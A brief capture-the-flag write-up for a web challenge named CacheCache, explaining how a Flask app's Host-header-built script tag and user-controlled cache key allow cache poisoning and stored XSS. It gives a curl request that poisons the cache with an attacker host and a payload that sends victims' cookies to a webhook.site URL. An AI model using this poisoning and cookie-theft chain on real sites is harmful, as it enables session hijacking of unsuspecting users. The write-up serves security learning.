Write-up of CacheCache

There are vulnerabilities present in the code due to cache poisoning and Cross-Site Scripting (XSS) attacks originating from the Host header. The vulnerabilities arise from the following lines of code

@cache.cached(timeout=60, make_cache_key=make_key)
<script src="http://{request.headers.get('Host')}/script/main.js"></script>

The make_key function determines the cache key, which can be influenced by a GET parameter named cachekey. Here's the function

def make_key():
    cachekey = request.args.get("cachekey")
    return cachekey if cachekey else ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))

Exploiting these vulnerabilities involves sending a curl request to change the host from which the script is loaded and utilizing a custom cache key for cache poisoning. Here's the curl request

```$ curl "http://challenge.midnightflag.fr:10110/?cachekey=worty" -H "Host: attacker.fr"```

Additionally, on the server, a script needs to be hosted at /script/main.js with the following content

fetch("https://webhook.site/[UUID]/?data="+btoa(document.cookie));

This script sends the victim's cookies to a specified webhook site. The flag for this vulnerability is ....
